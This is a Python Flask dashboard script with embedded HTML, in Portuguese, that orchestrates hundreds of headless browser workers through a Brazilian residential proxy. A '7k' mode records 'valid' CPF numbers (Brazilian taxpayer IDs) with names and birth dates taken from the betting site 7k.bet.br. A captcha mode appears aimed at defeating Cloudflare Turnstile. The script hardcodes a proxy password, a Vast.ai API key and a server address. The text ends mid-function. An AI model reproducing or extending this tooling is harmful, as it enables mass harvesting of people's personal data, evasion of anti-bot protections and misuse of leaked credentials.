"""
Dashboard Browserless v3 - Com IP Customizável + Proxy BR
"""
import json
import random
import re
import time
import os
import sys
import requests
import base64
from datetime import datetime
from flask import Flask, render_template_string, jsonify, request
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from playwright.sync_api import sync_playwright
import warnings

# Suprimir warnings do Playwright sobre erros internos
warnings.filterwarnings('ignore', category=UserWarning)

# Handler global para suprimir erros do Playwright que ocorrem em event listeners
def suppress_playwright_errors(exctype, value, traceback):
    """Suprime erros do Playwright que ocorrem em event listeners."""
    if exctype == KeyError and 'error' in str(value):
        # Erro interno do Playwright - apenas logar, não quebrar
        print(f"[WARNING] Erro interno do Playwright suprimido: {value}", file=sys.stderr)
        return
    # Para outros erros, usar o handler padrão
    sys.__excepthook__(exctype, value, traceback)

# Configurar handler global (apenas para threads)
original_excepthook = sys.excepthook

# Configurações Padrão
DEFAULT_WS_ENDPOINT = "ws://50.217.254.165:40422"

# Proxy residencial Brasil
PROXY_CONFIG = {
    "server": "http://pybpm-ins-hxqlzicm.pyproxy.io:2510",
    "username": "liderbet1-zone-adam-region-br",
    "password": "Aa10203040"
}

# Vast.ai API
VAST_AI_API_KEY = "aedf78cb67968495b0e91b71886b7444fd24d9146ce0da4c12cd5a356451d6c7"
VAST_AI_API_URL = "https://console.vast.ai/api/v0/instances/"
BROWSERLESS_INTERNAL_PORT = 3000  # Porta interna do Browserless (3000/tcp)
DEFAULT_BROWSERLESS_PORT = 40422  # Porta padrão fallback se não encontrar mapeamento

app = Flask(__name__)

# Estado global
state = {
    "ws_endpoint": DEFAULT_WS_ENDPOINT,
    "proxy_server": PROXY_CONFIG["server"],
    "proxy_username": PROXY_CONFIG["username"],
    "proxy_password": PROXY_CONFIG["password"]
}

state_lock = threading.Lock()

# Armazenamento de screenshots dos workers (worker_id -> {screenshot: base64, url: str, timestamp: float})
worker_screenshots = {}
screenshots_lock = threading.Lock()

# Estado global: capturar screenshots (padrão: True)
capture_screenshots_enabled = True
screenshots_enabled_lock = threading.Lock()

# Flag global para parar workers (modo 7k)
workers_should_stop = False
workers_stop_lock = threading.Lock()

# Estado global: logs habilitados (padrão: True)
logs_enabled = True
logs_enabled_lock = threading.Lock()

# Dicionário para controlar frequência de logs de erro (evitar spam)
worker_error_log_times = {}
worker_error_log_lock = threading.Lock()

# Configuração de logging em arquivo
LOG_FILE = "dashboard_7k_logs.txt"
CPFS_VALIDOS_FILE = "cpfs_validos.txt"
TURNSTILE_TOKEN_FILE = "turnstile_token.json"
TURNSTILE_SITEKEY_FILE = "turnstile_sitekey.json"
log_file_lock = threading.Lock()
cpfs_validos_lock = threading.Lock()
turnstile_token_lock = threading.Lock()

# Estatísticas globais de Captcha/Turnstile
captcha_stats = {
    "solved": 0,
    "failed": 0,
    "reloads": 0,
    "start_time": None
}
captcha_stats_lock = threading.Lock()

# Flag para parar workers de captcha
captcha_should_stop = False
captcha_stop_lock = threading.Lock()

def escrever_log(mensagem):
    """Escreve uma mensagem no arquivo de log com timestamp."""
    # Verificar se os logs estão habilitados
    with logs_enabled_lock:
        if not logs_enabled:
            return
    
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {mensagem}\n"
        
        with log_file_lock:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(log_entry)
    except Exception as e:
        # Se falhar ao escrever no arquivo, não quebra o programa
        pass

def salvar_cpf_valido(cpf, nome=None, data_nascimento=None, worker_id=None):
    """Salva um CPF válido encontrado em arquivo separado."""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        nome_str = nome if nome else "N/A"
        data_nasc_str = data_nascimento if data_nascimento else "N/A"
        worker_str = f"Worker {worker_id}" if worker_id else "N/A"
        
        # Verificar se o arquivo existe, se não existir, criar com cabeçalho
        arquivo_existe = os.path.exists(CPFS_VALIDOS_FILE)
        
        with cpfs_validos_lock:
            with open(CPFS_VALIDOS_FILE, "a", encoding="utf-8") as f:
                # Adicionar cabeçalho se for a primeira vez
                if not arquivo_existe:
                    f.write("=" * 100 + "\n")
                    f.write("CPFs VÁLIDOS ENCONTRADOS - 7k.bet.br\n")
                    f.write("=" * 100 + "\n")
                    f.write("CPF | Nome | Data Nascimento | Worker | Data/Hora\n")
                    f.write("-" * 100 + "\n")
                
                # Formato: CPF | Nome | Data Nascimento | Worker | Data/Hora
                linha = f"{cpf} | {nome_str} | {data_nasc_str} | {worker_str} | {timestamp}\n"
                f.write(linha)
        
        log_print(f"✅ CPF VÁLIDO SALVO: {cpf} | Nome: {nome_str} | Data Nasc: {data_nasc_str}")
    except Exception as e:
        # Se falhar ao escrever no arquivo, não quebra o programa
        pass

def log_print(mensagem):
    """Print que também escreve no arquivo de log."""
    # Verificar se os logs estão habilitados antes de fazer print também
    with logs_enabled_lock:
        enabled = logs_enabled
    
    if not enabled:
        return
    
    # Fazer print com flush para garantir que apareça imediatamente
    print(mensagem, flush=True)
    escrever_log(mensagem)

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🌐 Browserless Dashboard v3 - Custom Server</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Outfit', sans-serif;
            background: #0f172a;
            color: #e2e8f0;
            min-height: 100vh;
            background-image: 
                radial-gradient(ellipse at 20% 0%, rgba(56, 189, 248, 0.15) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 100%, rgba(168, 85, 247, 0.15) 0%, transparent 50%);
        }
        .container { max-width: 1400px; margin: 0 auto; padding: 1.5rem; }
        header {
            text-align: center;
            padding: 2rem;
            background: linear-gradient(135deg, #1e293b 0%, rgba(56, 189, 248, 0.1) 100%);
            border-radius: 20px;
            border: 1px solid #334155;
            margin-bottom: 1.5rem;
        }
        h1 {
            font-size: 2.2rem;
            background: linear-gradient(135deg, #38bdf8, #a855f7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }
        .subtitle { color: #94a3b8; }
        
        /* Config Box */
        .config-box {
            background: linear-gradient(135deg, #1e293b 0%, rgba(249, 115, 22, 0.1) 100%);
            border-radius: 16px;
            padding: 1.5rem;
            border: 1px solid #334155;
            margin-bottom: 1.5rem;
        }
        .config-header {
            display: flex;
            align-items: center;
            gap: 1rem;
            margin-bottom: 1rem;
        }
        .config-icon {
            width: 48px;
            height: 48px;
            background: rgba(249, 115, 22, 0.2);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
        }
        .config-title { font-size: 1.2rem; font-weight: 600; }
        .config-desc { color: #94a3b8; font-size: 0.85rem; }
        .config-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1rem;
        }
        .config-field {
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
        }
        .config-label {
            font-size: 0.85rem;
            color: #94a3b8;
            font-weight: 500;
        }
        .config-input {
            padding: 0.75rem 1rem;
            border: 2px solid #334155;
            border-radius: 10px;
            background: #0f172a;
            color: #e2e8f0;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9rem;
        }
        .config-input:focus {
            outline: none;
            border-color: #f97316;
            box-shadow: 0 0 0 3px rgba(249, 115, 22, 0.2);
        }
        
        .url-box {
            background: linear-gradient(135deg, #1e293b 0%, rgba(34, 197, 94, 0.1) 100%);
            border-radius: 16px;
            padding: 1.5rem;
            border: 1px solid #334155;
            margin-bottom: 1.5rem;
        }
        .url-box-header {
            display: flex;
            align-items: center;
            gap: 1rem;
            margin-bottom: 1rem;
        }
        .url-box-icon {
            width: 48px;
            height: 48px;
            background: rgba(34, 197, 94, 0.2);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
        }
        .url-box-title { font-size: 1.3rem; font-weight: 600; }
        .url-box-desc { color: #94a3b8; font-size: 0.9rem; }
        .url-input-row {
            display: flex;
            gap: 1rem;
            margin-bottom: 1rem;
            flex-wrap: wrap;
        }
        .url-input {
            flex: 1;
            min-width: 300px;
            padding: 1rem 1.5rem;
            border: 2px solid #334155;
            border-radius: 12px;
            background: #0f172a;
            color: #e2e8f0;
            font-family: 'JetBrains Mono', monospace;
            font-size: 1rem;
        }
        .url-input:focus {
            outline: none;
            border-color: #22c55e;
            box-shadow: 0 0 0 3px rgba(34, 197, 94, 0.2);
        }
        .workers-input {
            width: 100px;
            padding: 1rem;
            border: 2px solid #334155;
            border-radius: 12px;
            background: #0f172a;
            color: #e2e8f0;
            font-family: 'JetBrains Mono', monospace;
            font-size: 1rem;
            text-align: center;
        }
        .btn {
            padding: 1rem 2rem;
            border: none;
            border-radius: 12px;
            font-family: inherit;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            transition: all 0.2s;
        }
        .btn-primary {
            background: linear-gradient(135deg, #22c55e, #16a34a);
            color: white;
        }
        .btn-primary:hover { box-shadow: 0 5px 20px rgba(34, 197, 94, 0.4); }
        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
        .btn-secondary {
            background: #1e293b;
            color: #e2e8f0;
            border: 1px solid #334155;
        }
        .btn-danger {
            background: linear-gradient(135deg, #ef4444, #dc2626);
            color: white;
        }
        .btn-orange {
            background: linear-gradient(135deg, #f97316, #ea580c);
            color: white;
        }
        .quick-links { display: flex; gap: 0.5rem; flex-wrap: wrap; }
        .quick-link {
            padding: 0.5rem 1rem;
            background: #1e293b;
            border: 1px solid #334155;
            border-radius: 20px;
            font-size: 0.85rem;
            color: #94a3b8;
            cursor: pointer;
            transition: all 0.2s;
        }
        .quick-link:hover { background: #22c55e; color: white; border-color: #22c55e; }
        
        /* Stats Grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 1rem;
            margin-bottom: 1.5rem;
        }
        .stat-card {
            background: #1e293b;
            border-radius: 16px;
            padding: 1.25rem;
            border: 1px solid #334155;
            text-align: center;
        }
        .stat-icon { font-size: 1.8rem; margin-bottom: 0.5rem; }
        .stat-value {
            font-family: 'JetBrains Mono', monospace;
            font-size: 1.8rem;
            font-weight: 700;
            margin-bottom: 0.25rem;
        }
        .stat-label { color: #94a3b8; font-size: 0.85rem; }
        .stat-value.green { color: #22c55e; }
        .stat-value.blue { color: #38bdf8; }
        .stat-value.purple { color: #a855f7; }
        .stat-value.orange { color: #f59e0b; }
        .stat-value.red { color: #ef4444; }
        
        /* Workers Grid */
        .workers-container {
            background: #1e293b;
            border-radius: 16px;
            padding: 1.5rem;
            border: 1px solid #334155;
            margin-bottom: 1.5rem;
        }
        .workers-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1rem;
            flex-wrap: wrap;
            gap: 0.5rem;
        }
        .workers-title { font-size: 1.2rem; font-weight: 600; }
        .workers-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 0.75rem;
            max-height: 800px;
            overflow-y: auto;
        }
        .workers-grid::-webkit-scrollbar {
            width: 8px;
        }
        .workers-grid::-webkit-scrollbar-track {
            background: #0f172a;
            border-radius: 4px;
        }
        .workers-grid::-webkit-scrollbar-thumb {
            background: #334155;
            border-radius: 4px;
        }
        .workers-grid::-webkit-scrollbar-thumb:hover {
            background: #475569;
        }
        .view-mode-toggle {
            display: flex;
            gap: 0.5rem;
            align-items: center;
        }
        .view-mode-btn {
            padding: 0.4rem 0.8rem;
            border: 1px solid #334155;
            background: #0f172a;
            color: #94a3b8;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.85rem;
            transition: all 0.2s;
        }
        .view-mode-btn.active {
            background: #22c55e;
            color: white;
            border-color: #22c55e;
        }
        .view-mode-btn:hover {
            background: #1e293b;
            border-color: #475569;
        }
        .view-mode-btn.active:hover {
            background: #16a34a;
        }
        .compact-group {
            background: #0f172a;
            border: 2px solid #334155;
            border-radius: 12px;
            padding: 1rem;
            margin-bottom: 0.75rem;
        }
        .compact-group-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: pointer;
            user-select: none;
        }
        .compact-group-title {
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        .compact-group-count {
            background: #1e293b;
            padding: 0.25rem 0.75rem;
            border-radius: 12px;
            font-size: 0.85rem;
            font-weight: 600;
        }
        .compact-group-content {
            margin-top: 0.75rem;
            display: none;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 0.75rem;
        }
        .compact-group.expanded .compact-group-content {
            display: grid;
        }
        .worker-card {
            background: #0f172a;
            border-radius: 12px;
            padding: 1rem;
            border: 2px solid #334155;
            display: flex;
            align-items: center;
            gap: 1rem;
            transition: all 0.3s;
        }
        .worker-card.pending { border-color: #475569; }
        .worker-card.running { border-color: #f59e0b; animation: pulse 1.5s infinite; }
        .worker-card.success { border-color: #22c55e; background: rgba(34, 197, 94, 0.1); }
        .worker-card.error { border-color: #ef4444; background: rgba(239, 68, 68, 0.1); }
        
        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.4); }
            50% { box-shadow: 0 0 0 8px rgba(245, 158, 11, 0); }
        }
        
        .worker-number {
            width: 36px;
            height: 36px;
            background: #1e293b;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'JetBrains Mono', monospace;
            font-weight: 700;
            font-size: 0.9rem;
        }
        .worker-info { flex: 1; min-width: 0; }
        .worker-status { font-weight: 600; font-size: 0.9rem; margin-bottom: 0.25rem; }
        .worker-title {
            font-size: 0.85rem;
            color: #38bdf8;
            font-weight: 600;
            margin-bottom: 0.25rem;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .worker-details { 
            font-size: 0.75rem; 
            color: #94a3b8; 
            font-family: 'JetBrains Mono', monospace;
            word-break: break-word;
            overflow-wrap: break-word;
            max-height: 60px;
            overflow-y: auto;
            line-height: 1.4;
        }
        .worker-icon { font-size: 1.5rem; }
        
        /* Progress Bar */
        .progress-container {
            background: #0f172a;
            border-radius: 12px;
            padding: 1rem 1.5rem;
            margin-bottom: 1rem;
        }
        .progress-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 0.5rem;
        }
        .progress-bar {
            height: 12px;
            background: #334155;
            border-radius: 6px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #22c55e, #38bdf8);
            border-radius: 6px;
            transition: width 0.3s;
        }
        
        /* Logs */
        .logs-box {
            background: #1e293b;
            border-radius: 16px;
            padding: 1.5rem;
            border: 1px solid #334155;
        }
        .logs-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1rem;
        }
        .logs-title { font-size: 1.2rem; font-weight: 600; }
        .logs-content {
            background: #0f172a;
            border-radius: 8px;
            padding: 1rem;
            max-height: 400px;
            overflow-y: auto;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8rem;
            line-height: 1.5;
        }
        .log-line { padding: 0.25rem 0; border-bottom: 1px solid #1e293b; }
        .log-success { color: #22c55e; }
        .log-error { color: #ef4444; }
        .log-info { color: #38bdf8; }
        .log-warning { color: #f59e0b; }
        
        /* Servers Section */
        .server-card {
            background: #0f172a;
            border: 2px solid #334155;
            border-radius: 12px;
            padding: 1rem;
            margin-bottom: 0.75rem;
            display: flex;
            gap: 1rem;
            align-items: center;
            flex-wrap: wrap;
        }
        .server-status {
            width: 14px;
            height: 14px;
            border-radius: 50%;
            flex-shrink: 0;
            transition: all 0.3s;
            box-shadow: 0 0 8px currentColor;
        }
        .server-status.testing {
            background: #f59e0b;
            box-shadow: 0 0 12px rgba(245, 158, 11, 0.8);
            animation: pulse 1.5s infinite;
        }
        .server-status.connected {
            background: #22c55e;
            box-shadow: 0 0 12px rgba(34, 197, 94, 0.6);
        }
        .server-status.disconnected {
            background: #ef4444;
            box-shadow: 0 0 12px rgba(239, 68, 68, 0.6);
        }
        .server-status.pending {
            background: #64748b;
            box-shadow: 0 0 8px rgba(100, 116, 139, 0.4);
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.6; transform: scale(1.1); }
        }
        .server-card input {
            flex: 1;
            min-width: 200px;
            padding: 0.75rem;
            border: 2px solid #334155;
            border-radius: 8px;
            background: #1e293b;
            color: #e2e8f0;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9rem;
        }
        .server-card input:focus {
            outline: none;
            border-color: #8b5cf6;
            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.2);
        }
        .server-workers-input {
            width: 100px;
            text-align: center;
        }
        .server-remove-btn {
            padding: 0.5rem 1rem;
            background: #ef4444;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.2s;
        }
        .server-remove-btn:hover {
            background: #dc2626;
            box-shadow: 0 2px 8px rgba(239, 68, 68, 0.3);
        }
        
        .loading {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid transparent;
            border-top-color: currentColor;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        footer { text-align: center; padding: 1.5rem; color: #64748b; font-size: 0.9rem; }
        footer a { color: #38bdf8; }
        
        /* Modal de Screenshot */
        .screenshot-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            z-index: 10000;
            padding: 2rem;
            overflow-y: auto;
        }
        .screenshot-modal.active {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .screenshot-modal-content {
            background: #1e293b;
            border-radius: 16px;
            padding: 2rem;
            max-width: 90%;
            max-height: 90vh;
            border: 2px solid #334155;
            position: relative;
        }
        .screenshot-modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1.5rem;
        }
        .screenshot-modal-title {
            font-size: 1.5rem;
            font-weight: 600;
            color: #e2e8f0;
        }
        .screenshot-modal-close {
            background: #ef4444;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 0.5rem 1rem;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.2s;
        }
        .screenshot-modal-close:hover {
            background: #dc2626;
        }
        .screenshot-container {
            text-align: center;
            margin-bottom: 1rem;
        }
        .screenshot-image {
            max-width: 100%;
            max-height: 70vh;
            border-radius: 8px;
            border: 2px solid #334155;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
        }
        .screenshot-info {
            background: #0f172a;
            padding: 1rem;
            border-radius: 8px;
            margin-top: 1rem;
            text-align: left;
        }
        .screenshot-info-item {
            margin-bottom: 0.5rem;
            color: #94a3b8;
            font-size: 0.9rem;
        }
        .screenshot-info-item strong {
            color: #e2e8f0;
        }
        .view-simulation-btn {
            padding: 0.4rem 0.8rem;
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.8rem;
            font-weight: 600;
            transition: all 0.2s;
            margin-left: 0.5rem;
        }
        .view-simulation-btn:hover {
            background: linear-gradient(135deg, #2563eb, #1d4ed8);
            box-shadow: 0 2px 8px rgba(59, 130, 246, 0.4);
        }
        .view-simulation-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .checkbox-label {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0 1rem;
            background: #1e293b;
            border-radius: 12px;
            cursor: pointer;
            border: 1px solid #334155;
            height: 54px;
        }
        .checkbox-label input { width: 18px; height: 18px; cursor: pointer; }
        
        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.5rem 1rem;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 500;
        }
        .status-badge.connected {
            background: rgba(34, 197, 94, 0.2);
            color: #22c55e;
            border: 1px solid #22c55e;
        }
        .status-badge.disconnected {
            background: rgba(239, 68, 68, 0.2);
            color: #ef4444;
            border: 1px solid #ef4444;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🌐 Browserless Dashboard v3</h1>
            <p class="subtitle">Servidor Customizável + Proxy BR Residencial</p>
        </header>
        
        <!-- Server Config -->
        <div class="config-box">
            <div class="config-header">
                <div class="config-icon">⚙️</div>
                <div>
                    <div class="config-title">Configuração do Servidor</div>
                    <div class="config-desc">Configure o endpoint WebSocket e credenciais do proxy</div>
                </div>
                <span class="status-badge disconnected" id="server-status">⚪ Não testado</span>
            </div>
            <div class="config-grid">
                <div class="config-field">
                    <label class="config-label">🖥️ WebSocket Endpoint (IP:Porta)</label>
                    <input type="text" class="config-input" id="ws-endpoint" 
                           value="ws://50.217.254.165:40422"
                           placeholder="ws://IP:PORTA">
                </div>
                <div class="config-field" style="display: flex; align-items: flex-end; gap: 0.5rem;">
                    <div style="flex: 1;">
                        <label class="config-label">⏱️ Timeout (Minutos) - Tempo de Conexão</label>
                        <div style="display: flex; gap: 0.5rem; align-items: center;">
                            <input type="number" class="config-input" id="ws-timeout-minutes" 
                                   value="30" min="1" max="1440" step="1"
                                   placeholder="30" autocomplete="off"
                                   style="flex: 1;"
                                   title="Timeout em minutos. Será convertido automaticamente para milissegundos e concatenado ao endpoint WebSocket. Padrão: 30 minutos"
                                   onchange="atualizarTimeoutPreview()"
                                   oninput="atualizarTimeoutPreview()">
                            <span style="color: #94a3b8; font-size: 0.9rem; white-space: nowrap; min-width: 80px;" id="timeout-preview">(1800000ms)</span>
                        </div>
                    </div>
                    <button class="btn btn-success" onclick="aplicarTimeoutTodosServidores()" 
                            style="height: 54px; white-space: nowrap; padding: 0 1.5rem; font-weight: 600; box-shadow: 0 2px 8px rgba(34, 197, 94, 0.3);"
                            title="Aplicar timeout a todos os servidores que ainda não têm configurado">
                        ✅ Aplicar a Todos
                    </button>
                </div>
                <div class="config-field">
                    <label class="config-label">🌐 Proxy Server</label>
                    <input type="text" class="config-input" id="proxy-server" 
                           value="http://pybpm-ins-hxqlzicm.pyproxy.io:2510"
                           placeholder="http://host:porta" autocomplete="off">
                </div>
                <div class="config-field">
                    <label class="config-label">👤 Proxy Username</label>
                    <input type="text" class="config-input" id="proxy-username" 
                           value="liderbet1-zone-adam-region-br"
                           placeholder="username" autocomplete="off">
                </div>
                <div class="config-field">
                    <label class="config-label">🔑 Proxy Password</label>
                    <input type="password" class="config-input" id="proxy-password" 
                           value="Aa10203040"
                           placeholder="password" autocomplete="off">
                </div>
            </div>
            <div style="margin-top: 1rem; display: flex; gap: 1rem; flex-wrap: wrap;">
                <button class="btn btn-orange" onclick="testConnection()">🔍 Testar Conexão</button>
                <button class="btn btn-secondary" onclick="saveConfig()">💾 Salvar Config</button>
            </div>
        </div>
        
        <div class="url-box" style="background: linear-gradient(135deg, #1e293b 0%, rgba(139, 92, 246, 0.1) 100%);">
            <div class="url-box-header">
                <div class="url-box-icon">🖥️</div>
                <div>
                    <div class="url-box-title">Servidores Múltiplos</div>
                    <div class="url-box-desc">Adicione múltiplos servidores e distribua workers entre eles</div>
                </div>
            </div>
            <div id="servers-list" style="margin-bottom: 1rem;">
                <!-- Servidores serão adicionados aqui dinamicamente -->
            </div>
            <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; align-items: center;">
                <button class="btn btn-secondary" onclick="addServer()" style="padding: 0.75rem 1.5rem;">➕ Adicionar Servidor</button>
                <button class="btn btn-secondary" onclick="syncVastAI()" style="padding: 0.75rem 1.5rem;">🔄 Sincronizar Vast.ai</button>
                <button class="btn btn-secondary" onclick="clearServers()" style="padding: 0.75rem 1.5rem;">🗑️ Limpar Todos</button>
                <div style="display: flex; gap: 0.5rem; align-items: center;">
                    <input type="number" id="global-workers-input" 
                           placeholder="50" 
                           value="50" 
                           min="1" 
                           max="500"
                           style="width: 80px; padding: 0.75rem; border: 2px solid #334155; border-radius: 8px; background: #1e293b; color: #e2e8f0; font-size: 0.9rem; text-align: center;"
                           title="Workers para aplicar em todos os servidores"
                           onkeypress="if(event.key === 'Enter') setAllWorkers()">
                    <button class="btn btn-primary" onclick="setAllWorkers()" style="padding: 0.75rem 1.5rem; white-space: nowrap;">⚡ Definir Workers para Todos</button>
                </div>
                <span id="servers-summary" style="padding: 0.75rem; color: #94a3b8; font-size: 0.9rem;"></span>
            </div>
        </div>
        
        <div class="url-box">
            <div class="url-box-header">
                <div class="url-box-icon">🔗</div>
                <div>
                    <div class="url-box-title">Acessar URL com Múltiplas Máquinas</div>
                    <div class="url-box-desc">Configure a URL, quantidade de workers e execute</div>
                </div>
            </div>
            <div class="url-input-row">
                <input type="text" class="url-input" id="url-input" 
                       placeholder="https://www.exemplo.com"
                       value="https://api.ipify.org?format=json"
                       onkeypress="if(event.key === 'Enter') startWorkers()">
                <input type="number" class="workers-input" id="num-workers" 
                       value="20" min="1" max="500"
                       title="Número de navegadores simultâneos (máximo 500)">
                <label class="checkbox-label">
                    <input type="checkbox" id="use-proxy" checked>
                    <span>🇧🇷 Proxy BR</span>
                </label>
                <label class="checkbox-label">
                    <input type="checkbox" id="capture-screenshots" checked onchange="toggleScreenshots(this.checked)">
                    <span>📸 Capturar Screenshots</span>
                </label>
                <button class="btn btn-primary" id="start-btn" onclick="startWorkers()">
                    🚀 Iniciar 20 Workers
                </button>
                <button class="btn btn-success" id="start-7k-btn" onclick="startWorkers7k()" style="background: linear-gradient(135deg, #10b981 0%, #059669 100%);">
                    🎰 7k
                </button>
                <button class="btn" id="start-captcha-btn" onclick="startWorkersCaptcha()" style="background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%); color: white;">
                    🔐 Captcha
                </button>
                <button class="btn btn-danger" id="stop-btn" onclick="stopWorkers()" style="display: none;">
                    ⏹️ Parar
                </button>
            </div>
            <div class="quick-links">
                <span style="color: #64748b; margin-right: 0.5rem;">Links rápidos:</span>
                <span class="quick-link" onclick="setUrl('https://api.ipify.org?format=json')">Verificar IP</span>
                <span class="quick-link" onclick="setUrl('https://ipinfo.io/json')">IP Info</span>
                <span class="quick-link" onclick="setUrl('https://www.google.com.br')">Google BR</span>
                <span class="quick-link" onclick="setUrl('https://www.bet365.com')">Bet365</span>
                <span class="quick-link" onclick="setUrl('https://www.7k.bet.br')">7K Bet</span>
            </div>
        </div>
        
        <!-- Stats -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-icon">🖥️</div>
                <div class="stat-value blue" id="stat-total">0</div>
                <div class="stat-label">Total Workers</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">⚡</div>
                <div class="stat-value orange" id="stat-running">0</div>
                <div class="stat-label">Executando</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">✅</div>
                <div class="stat-value green" id="stat-success">0</div>
                <div class="stat-label">Sucesso</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">❌</div>
                <div class="stat-value red" id="stat-fail">0</div>
                <div class="stat-label">Falhas</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">🔐</div>
                <div class="stat-value" style="color: #8b5cf6;" id="stat-captcha">0</div>
                <div class="stat-label">Captchas</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">⏱️</div>
                <div class="stat-value purple" id="stat-time">0s</div>
                <div class="stat-label">Tempo Total</div>
            </div>
        </div>
        
        <!-- Progress -->
        <div class="progress-container" id="progress-container" style="display: none;">
            <div class="progress-header">
                <span>Progresso</span>
                <span id="progress-text">0 / 0</span>
            </div>
            <div class="progress-bar">
                <div class="progress-fill" id="progress-fill" style="width: 0%"></div>
            </div>
        </div>
        
        <!-- Workers Grid -->
        <div class="workers-container">
            <div class="workers-header">
                <span class="workers-title">📊 Status das Máquinas</span>
                <div class="view-mode-toggle">
                    <button class="view-mode-btn active" id="view-full-btn" onclick="setViewMode('full')" title="Visualização completa">📋 Completa</button>
                    <button class="view-mode-btn" id="view-compact-btn" onclick="setViewMode('compact')" title="Visualização compacta (otimizada para muitos workers)">📦 Compacta</button>
                    <button class="btn btn-secondary" onclick="clearWorkers()" style="padding: 0.5rem 1rem;">🗑️ Limpar</button>
                </div>
            </div>
            <div class="workers-grid" id="workers-grid">
                <div style="grid-column: 1/-1; text-align: center; padding: 2rem; color: #64748b;">
                    Configure o servidor e clique em "Iniciar" para começar
                </div>
            </div>
        </div>
        
        <!-- Logs -->
        <div class="logs-box">
            <div class="logs-header">
                <span class="logs-title">📋 Logs em Tempo Real</span>
                <div style="display: flex; gap: 0.5rem;">
                    <button class="btn btn-secondary" id="toggle-logs-btn" onclick="toggleLogs()" style="padding: 0.5rem 1rem;" title="Desativar/Ativar logs">🔊 Ativado</button>
                    <button class="btn btn-secondary" onclick="clearLogs()" style="padding: 0.5rem 1rem;">🗑️</button>
                </div>
            </div>
            <div class="logs-content" id="logs">
                <div class="log-line log-info">[Sistema] Dashboard v3 pronto - configure o servidor</div>
            </div>
        </div>
        
        <footer>🚀 Browserless Dashboard v3 - Custom Server + Proxy BR</footer>
    </div>
    
    <script>
        let isRunning = false;
        let startTime = null;
        let statusInterval = null;
        let workers = [];
        let viewMode = 'full'; // 'full' ou 'compact'
        const MAX_VISIBLE_CARDS = 200; // Limite de cards renderizados em modo full
        
        function setUrl(url) {
            document.getElementById('url-input').value = url;
        }
        
        let logsEnabled = true;
        
        async function toggleLogs() {
            try {
                const response = await fetch('/api/toggle-logs', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
